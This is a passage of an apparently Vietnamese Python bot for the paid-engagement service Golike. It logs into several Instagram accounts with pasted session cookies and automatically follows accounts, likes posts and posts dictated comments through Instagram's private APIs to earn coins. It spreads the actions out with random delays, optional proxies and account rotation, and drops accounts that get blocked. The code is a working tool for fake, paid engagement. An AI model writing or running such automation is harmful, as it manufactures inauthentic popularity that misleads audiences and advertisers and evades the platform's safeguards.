            'lsd': 'eDbmeABDqbP9S85vkxVBwB',
            '__spin_r': '1025471239',
            '__spin_b': 'trunk',
            '__spin_t': '1754300999',
            '__crn': 'comet.igweb.PolarisDesktopPostRoute',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'usePolarisLikeMediaLikeMutation',
            'variables': '{"media_id":"'+id_like+'","container_module":"single_post"}',
            'server_timestamps': 'true',
            'doc_id': '23951234354462179',
        }
        response = requests.post('https://www.instagram.com/graphql/query', headers=self.headers, data=data, proxies=proxyy).json()
        try:
            if 'errors' in response:
                for error in response['errors']:
                    if "Sorry, this media has been deleted" in error['description']:
                        return 0
                    else:
                        return False
            else:
                if 'xdt_mark_media_like' in response['data']:
                    return True
                else:
                    return False
        except:
            return False

    def comment_ins(self, id_bv, ndcmt, proxyy):
        requests_comment = requests.post(f"https://www.instagram.com/api/v1/web/comments/{id_bv}/add/",data={"comment_text": ndcmt},headers=self.headers, proxies=proxyy).json()
        if requests_comment['status'] == 'ok':
            return True
        else:
            return False
        
class API_GOLIKE:
    def __init__(self, authorization):
        self.authorization = authorization
        self.headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=utf-8',
            'Authorization': self.authorization,
            't': 'VFZSak1FOVVZelZPYWxrelRrRTlQUT09',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
    def get_infogolike(self):
        resp = scraper.get('https://gateway.golike.net/api/users/me', headers=self.headers)
        data = safe_json(resp)
        if data and 'status' in data and data['status'] == 200:
            username = data['data']['username']
            coin = data['data']['coin']
            return username, coin
        else:
            print(f"Lỗi get_infogolike: {resp.text[:100]}...")
            return False

        
    def setnickig(self):
        resp = scraper.get('https://gateway.golike.net/api/instagram-account', headers=self.headers)
        data = safe_json(resp)
        if data and 'status' in data and data['status'] == 200:
            return data
        else:
            print(f"Lỗi setnickig: {resp.text[:100]}...")
            return False
    
    def getjob(self, account_id):
        response = scraper.get('https://gateway.golike.net/api/advertising/publishers/instagram/jobs', params={'instagram_account_id': account_id, 'data': 'null'}, headers=self.headers).json()
        return response
        
    def nhan_coin(self, account_id, id_cc):
        rq_nj = scraper.post('https://gateway.golike.net/api/advertising/publishers/instagram/complete-jobs', headers=self.headers, json={'instagram_account_id': account_id, 'instagram_users_advertising_id': id_cc, 'async': True, 'data': 'null'}).json()
        return rq_nj
    
    def nhan_coin_coment(self, id_cc, account_id, id_cmt, ndcmt):
        json_data = {
            'instagram_users_advertising_id': id_cc,
            'instagram_account_id': account_id,
            'async': True,
            'data': 'null',
            'comment_id': id_cmt,
            'message': ndcmt,
        }
        response = scraper.post('https://gateway.golike.net/api/advertising/publishers/instagram/complete-jobs', headers=self.headers, json=json_data).json()
        return response
    
    def next_job(self, id_cc, object_id, account_id, nv_type):
        response = scraper.post('https://gateway.golike.net/api/report/send', headers=self.headers, json={'description': 'Không tìm thấy bài viết', 'users_advertising_id': id_cc, 'type': 'ads', 'provider': 'instagram', 'fb_id': account_id, 'error_type': 2}).json()
        rq_next = scraper.post('https://gateway.golike.net/api/advertising/publishers/instagram/skip-jobs', headers=self.headers, json={'ads_id': id_cc, 'object_id': object_id, 'account_id': account_id, 'type': nv_type}).json()
        return rq_next

def thanhngang(so=28):
    for i in range(so):
        print(RED+'--',end ='')
    print('')

def get_user_id(setnick, instagram_username):
    for user in setnick['data']:
        if user['instagram_username'] == instagram_username:
            return user['id']
    return 

def extract_ip(proxy):
    ip_port = proxy.split('@')[1]
    ip = ip_port.split(':')[0]
    return ip

def hoanthanh(dem, nv_type, object_id, price):
    global tong
    time = datetime.now().strftime("%H:%M:%S")
    tong += price
    format_tong = "{:,.0f}".format(int(tong)).replace(".", ",")
    
    print(f'{trang}| {vang}{dem} {trang}| {xanh}{time} {trang}| {xanh}{object_id} {trang}| {do}{nv_type} {trang}| {tim}+{price} {trang}| {vang}{format_tong} vnđ')

def nghingoi(delaymin, delaymax):
    delay = randint(delaymin, delaymax)
    for i in range(delay, -1, -1):
          print(f'{RED}[ {GREEN}GOLIKE INSTARGAM {RED}] {WHITE}{i} {GREEN}GIÂY          ',end = '\r');time.sleep(1)

def Nhap_Cookie(proxyy):
    list_cookie = []
    i = 0
    while True:
        i += 1
        cookie = input(f'{GREEN}NHẬP COOKIE INSTAGRAM THỨ {trang}[{xanh}{i}{trang}]: {WHITE}')
        if cookie == '' and i > 1:
            break
        instagram = API_INSTAGRAM_THIEUHOANG(cookie)
        logingram = instagram.login_ins(proxyy)
        if logingram != False:
            user = logingram[0]
            id_user = logingram[1]
            
            print(f'{luc}Name{trang}: {vang}{user} {trang}| {luc}ID: {vang}{id_user}')
            
            list_cookie.append(cookie)
        else:
            print(f'{RED}COOKIE INSTAGRAM DIE !')
            i-=1
            thanhngang()
    return list_cookie

def GOLIKE_INSTAGRAM_THIEUHOANG():
    dem = 0
    loifl = 0
    loilike = 0
    loicmt = 0
    banner()
    pro = str(input(f'{GREEN}Bạn có muốn chạy bằng proxy không? {RED}({GREEN}Y{RED}/{YELLOW}n{RED}): {WHITE}'))
    if pro.lower() == 'y':
        thanhngang()
        print(f'{GREEN}NHẬP PROXY THEO ĐỊNH DẠNG {RED}[ {YELLOW}USERNAME{RED}:{YELLOW}PASS{RED}@{YELLOW}IP{RED}:{YELLOW}PORT {RED}]')
        proxy = str(input(f'{GREEN}Nhập Proxy: {WHITE}'))
        thanhngang()
        proxyy = {
            'http':'http://'+proxy,
            'https':'http://'+proxy,
        }
        check_ip = requests.get('https://api.myip.com',proxies=proxyy).json()
    else:
        proxyy = {}
        check_ip = requests.get('https://api.myip.com',proxies=proxyy).json()
    print(f'{GREEN}IP: {CYAN}'+check_ip['ip'])
    nghingoi(1, 3)
    banner()
    if os.path.exists('Authorization.txt'):
        with open('Authorization.txt', 'r', encoding='utf-8') as file:
            authorization = file.read().strip()
            GOLIKE_API = API_GOLIKE(authorization)
            info_golike = GOLIKE_API.get_infogolike()
            if info_golike != False:
                user_golike = info_golike[0]
                coin = info_golike[1]
                while True:
                    try:
                        selece_Author = str(input(f'{trang}>> {GREEN}Bạn Có Muốn Sử Dụng Tài Khoản Golike {CYAN}{user_golike} {GREEN}Nữa Không {RED}[{YELLOW}Y{RED}/{BLUE}n{RED}]: {trang}'))
                        break
                    except:
                        continue
                if selece_Author.lower() != 'y':
                    file.close()
                    os.remove('Authorization.txt')
                    while True:
                        banner()
                        authorization = input(f"{trang}>> {GREEN}Nhập Authorization Golike: {BLUE}")
                        GOLIKE_API = API_GOLIKE(authorization)
                        info_golike = GOLIKE_API.get_infogolike()
                        if info_golike != False:
                            user_golike = info_golike[0]
                            coin = info_golike[1]
                            with open('Authorization.txt', 'w') as file:
                                file.write(authorization)
                            break
                        else:
                            print(f'{trang}>> {RED}Login Golike Thất Bại !');time.sleep(3)
                            continue
            else:
                file.close()
                os.remove('Authorization.txt')
                while True:
                    banner()
                    authorization = input(f"{trang}>> {GREEN}Nhập Authorization Golike: {BLUE}")
                    GOLIKE_API = API_GOLIKE(authorization)
                    info_golike = GOLIKE_API.get_infogolike()
                    if info_golike != False:
                        user_golike = info_golike[0]
                        coin = info_golike[1]
                        with open('Authorization.txt', 'w') as file:
                            file.write(authorization)
                        break
                    else:
                        print(f'{trang}>> {RED}Login Golike Thất Bại !');time.sleep(3)
                        continue
    else:
        while True:
            authorization = input(f"{trang}>> {GREEN}Nhập Authorization Golike: {trang}")
            GOLIKE_API = API_GOLIKE(authorization)
            info_golike = GOLIKE_API.get_infogolike()
            if info_golike != False:
                user_golike = info_golike[0]
                coin = info_golike[1]
                with open('Authorization.txt', 'w') as file:
                    file.write(authorization)
                break
            else:
                print(f'{trang}>> {RED}Login Golike Thất Bại !');time.sleep(3)
                continue
    banner()
    list_cookie = Nhap_Cookie(proxyy)
    banner()
    formatted_coin = f"{coin:,.0f}"
    print(f'{trang}>> {GREEN}Name{RED}: {CYAN}{user_golike}')
    print(f'{trang}>> {GREEN}Coin{RED}: {CYAN}{formatted_coin}')
    print(f'{trang}>> {GREEN}Số Lượng Instagram {RED}: {CYAN}{len(list_cookie)}')
    print(f'{trang}>> {GREEN}IP: {CYAN}'+check_ip['ip'])
    print(f"{trang}──────────────────────────────────────────────────────────────────────")
    delaymin = int(input(f'{trang}>> {GREEN}Nhập Delay Min: {WHITE}'))
    delaymax = int(input(f'{trang}>> {GREEN}Nhập Delay Max: {WHITE}'))
    doinick = int(input(f'{trang}>> {GREEN}Sau Bao Nhiêu Nhiệm Vụ Thì Đổi Nick: {WHITE}'))
    print(f"{trang}──────────────────────────────────────────────────────────────────────")
    while True:
        if len(list_cookie) == 0:
            print(f'{RED}Đã Xoá Tất Cả Cookie !')
            list_cookie = Nhap_Cookie(proxyy)
        for cookie in list_cookie:
            ins = API_INSTAGRAM_THIEUHOANG(cookie)
            check_log = ins.login_ins(proxyy)
            if check_log != False:
                user = check_log[0]
                id_user = check_log[1]
            else:
                print(f'{RED}Login Cookie Thất Bại !')
                continue
            setnick = GOLIKE_API.setnickig()
            if setnick != False:
                account_id = get_user_id(setnick, user)
                if account_id == None:
                    print(f'{RED}Có vẻ như bạn chưa thêm tài khoản instagram vào golike !')
                    return
                if pro.lower() == 'y':
                    last_five = requests.get('https://api.myip.com',proxies=proxyy).json()['ip']
                    last_five_kk = last_five[-7:]
                    check_pp = "*" * 5 + last_five_kk
                else:
                    check_pp = 'None'
                
                print(f'{trang}[{luc}RUN{trang}] >> {vang}{user} {trang}| {tim}{account_id} {trang}| {luc}Proxy{trang}: {vang}{check_pp}')
                
                while True:
                    data_job = GOLIKE_API.getjob(account_id)
                    if data_job['status'] ==200:
                        id_cc = data_job['data']['id']
                        object_id = data_job['data']['object_id']
                        nv_type = data_job['data']['type']
                        print(f'{GREEN}Đang Làm Job {YELLOW}{nv_type} {CYAN}{id_cc}                    ',end = '\r')
                        if nv_type == 'follow':
                            follow = ins.follow_ins(object_id, proxyy)
                            print(f'{GREEN}Chờ một xíu nhận coin        ',end = '\r');time.sleep(2)
                            if follow == True:
                                data_coin = GOLIKE_API.nhan_coin(account_id, id_cc)
                                if 'Báo cáo hoàn thành lại thành công,cảm ơn bạn !' in str(data_coin):
                                    print(f'{RED}Job Follow Này Đã Làm Rồi Bỏ Qua !            ', end = '\r');time.sleep(1)
                                    nghingoi(delaymin, delaymax)
                                elif data_coin['success'] == True:
                                    dem += 1
                                    loifl = 0
                                    price = data_coin['data']['prices']
                                    hoanthanh(dem, nv_type, object_id, price)
                                    if dem % doinick == 0:
                                        break
                                    else:
                                        nghingoi(delaymin, delaymax)
                                else:
                                    ffg = f'Hệ thống không thể kiểm tra bạn chưa làm việc,vui lòng thử lại với tài khoản {user}'
                                    if ffg in str(data_coin):
                                        print(f'{RED}Chờ một tí thử nhận coin follow lại !    ',end = '\r');time.sleep(2)
                                        time.sleep(10)
                                        data_coin = GOLIKE_API.nhan_coin(account_id, id_cc)
                                        if 'Báo cáo hoàn thành lại thành công,cảm ơn bạn !' in str(data_coin):
                                            print(f'{RED}Job Follow Này Đã Làm Rồi Bỏ Qua !            ', end = '\r');time.sleep(1)
                                            nghingoi(delaymin, delaymax)
                                        elif data_coin['success'] == True:
                                            dem += 1
                                            loifl = 0
                                            price = data_coin['data']['prices']
                                            hoanthanh(dem, 'follow_2', object_id, price)
                                            if dem % doinick == 0:
                                                break
                                            else:
                                                nghingoi(delaymin, delaymax)
                                        else:
                                            print(f'{RED}Nhận Coin Thất Bại !               ',end = '\r');time.sleep(2)
                                            data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                            if data_next ['status'] == 200:
                                                print(data_next['message'],end = '\r');time.sleep(1)
                                                nghingoi(delaymin, delaymax)
                                    else:
                                        print(f'{RED}Nhận Coin Thất Bại !               ',end = '\r');time.sleep(2)
                                        data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                        if data_next ['status'] == 200:
                                            print(data_next['message'],end = '\r');time.sleep(1)
                                            nghingoi(delaymin, delaymax)

                            else:
                                loifl += 1
                                print(f'{RED}{follow} Follow THẤT BẠI LẦN {loifl} !   ',end = '\r');time.sleep(1)
                                data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                if data_next ['status'] == 200:
                                    print(data_next['message'],end = '\r');time.sleep(1)
                                if loifl >= 7:
                                    check_acc = ins.login_ins(proxyy)
                                    if check_acc != False:
                                        print(f'{RED}Tài Khoản {YELLOW}{user} {RED}Đã Bị Block !')
                                    else:
                                        print(f'{RED}Tài Khoản {YELLOW}{user} {RED}Đã Bị Văng Cookie !')
                                    loifl = 0
                                    list_cookie.remove(cookie)
                                    break
                                else:
                                    nghingoi(delaymin, delaymax)

                        elif nv_type == 'like':
                            try:
                                description_value = data_job['data']['description']
                                if '_' in description_value:
                                    id_like = description_value.split('_')[0]
                                else:
                                    id_like = description_value
                            except:
                                print(f'{RED}Lỗi 491 !')
                                return

                            like = ins.like_ins(id_like, proxyy)
                            if like == 0:
                                print(f'{RED}Không Tìm Thấy Bài Viết Like             ',end = '\r');time.sleep(1)
                                data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                if data_next ['status'] == 200:
                                    print(data_next['message'],end = '\r');time.sleep(1)
                                    nghingoi(delaymin, delaymax)
                            elif like == True:
                                data_coin = GOLIKE_API.nhan_coin(account_id, id_cc)
                                if 'Báo cáo hoàn thành lại thành công,cảm ơn bạn !' in str(data_coin):
                                    print(f'{RED}Job Like Này Đã Làm Rồi Bỏ Qua !            ', end = '\r');time.sleep(1)
                                    nghingoi(delaymin, delaymax)
                                elif data_coin['success'] == True:
                                    dem += 1
                                    loilike = 0
                                    price = data_coin['data']['prices']
                                    hoanthanh(dem, nv_type, object_id, price)
                                    if dem % doinick == 0:
                                        break
                                    else:
                                        nghingoi(delaymin, delaymax)
                                else:
                                    print(f'{RED}Nhận Coin Thất Bại !               ',end = '\r');time.sleep(2)
                                    data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                    if data_next ['status'] == 200:
                                        print(data_next['message'],end = '\r');time.sleep(1)
                                        nghingoi(delaymin, delaymax)
                            else:
                                loilike += 1
                                print(f'{RED}{like} Like THẤT BẠI LẦN {loilike} !   ',end = '\r');time.sleep(1)
                                data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                if data_next ['status'] == 200:
                                    print(data_next['message'],end = '\r');time.sleep(1)
                                if loilike >= 7:
                                    check_acc = ins.login_ins(proxyy)
                                    if check_acc != False:
                                        print(f'{RED}Tài Khoản {YELLOW}{user} {RED}Đã Bị Block !')
                                    else:
                                        print(f'{RED}Tài Khoản {YELLOW}{user} {RED}Đã Bị Văng Cookie !')
                                    loilike = 0
                                    list_cookie.remove(cookie)
                                    break
                                else:
                                    nghingoi(delaymin, delaymax)

                        elif nv_type == 'comment':
                            try:
                                description_value = data_job['data']['description']
                                if '_' in description_value:
                                    id_bv = description_value.split('_')[0]
                                else:
                                    id_bv = description_value
                            except:
                                print(f'{RED}Lỗi 547 !')
                                return
                            id_cmt = data_job["lock"]["comment_id"]
                            ndcmt = data_job["lock"]["message"]
                            comment = ins.comment_ins(id_bv, ndcmt, proxyy)
                            print(f'{GREEN}Chờ một xíu nhận coin        ',end = '\r');time.sleep(2)
                            if comment == True:
                                data_coin = GOLIKE_API.nhan_coin_coment(id_cc, account_id, id_cmt, ndcmt)
                                if 'Báo cáo hoàn thành lại thành công,cảm ơn bạn !' in str(data_coin):
                                        print(f'{RED}Job Comment Này Đã Làm Rồi Bỏ Qua !            ', end = '\r');time.sleep(1)
                                        nghingoi(delaymin, delaymax)
                                elif data_coin['success'] == True:
                                    dem += 1
                                    loicmt = 0
                                    price = data_coin['data']['prices']
                                    hoanthanh(dem, nv_type, object_id, price)
                                    if dem % doinick == 0:
                                        break
                                    else:
                                        nghingoi(delaymin, delaymax)
                                else:
                                    print(f'{RED}Nhận Coin Thất Bại !               ',end = '\r');time.sleep(2)
                                    data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                    if data_next ['status'] == 200:
                                        print(data_next['message'],end = '\r');time.sleep(1)
                                        nghingoi(delaymin, delaymax)
                            else:
                                loicmt += 1
                                print(f'{RED}{comment} Comment THẤT BẠI LẦN {loicmt} !   ',end = '\r');time.sleep(1)
                                data_next = GOLIKE_API.next_job(id_cc, object_id, account_id, nv_type)
                                if data_next ['status'] == 200:
                                    print(data_next['message'],end = '\r');time.sleep(1)
                                if loicmt >= 7:
                                    check_acc = ins.login_ins(proxyy)
                                    if check_acc != False:
                                        print(f'{RED}Tài Khoản {YELLOW}{user} {RED}Đã Bị Block !')
                                    else:
                                        print(f'{RED}Tài Khoản {YELLOW}{user} {RED}Đã Bị Văng Cookie !')
                                    loicmt = 0
                                    list_cookie.remove(cookie)
                                    break
                                else:
                                    nghingoi(delaymin, delaymax)

                    elif 'Hiện tại chưa có jobs mới,vui lòng nghỉ tay và quay lại sau 30p nhé !' in str(data_job):
                        print(f'{RED}Hiện Tại Hết Job Rồi Đợi Thôi          ', end = '\r');time.sleep(1)
                        nghingoi(15, 16)
                    elif 'Hệ thống đang tính toán jobs dành cho bạn,bấm load jobs lại để lấy ngay 100 jobs mới !' in str(data_job):
                        print(f'{RED}Hệ thống đang tính toán jobs dành cho bạn        ', end = '\r');time.sleep(1)
                        nghingoi(15, 16)
                    else:
                        print(data_job['message'],end = '\r')
                        nghingoi(10, 15)
                continue
                
if __name__ == "__main__":
    GOLIKE_INSTAGRAM_THIEUHOANG()
